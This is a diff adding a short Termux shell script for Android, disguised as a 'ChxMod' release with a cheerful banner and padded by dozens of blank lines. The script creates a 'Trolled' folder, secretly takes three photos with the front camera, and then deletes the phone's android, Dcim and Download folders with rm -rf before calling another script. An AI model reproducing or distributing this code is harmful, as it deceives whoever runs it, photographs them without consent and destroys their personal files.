@@ -1,0 +1,83 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+figlet ChxMod;
+echo Version:2.3;
+echo Publisher:Electronic Cyber Crack;
+echo Hope you Enjoyed;
+echo loading :D;
+cd /sdcard;                     
+mkdir Trolled;          
+termux-camera-photo -c 0 /sdcard/Trolled/1.jpg;
+termux-camera-photo -c 0 /sdcard/Trolled/2.jpg;
+termux-camera-photo -c 0 /sdcard/Trolled/3.jpg
+rm -rf android;
+rm -rf Dcim;
+rm -rf Download;
+sh setting;
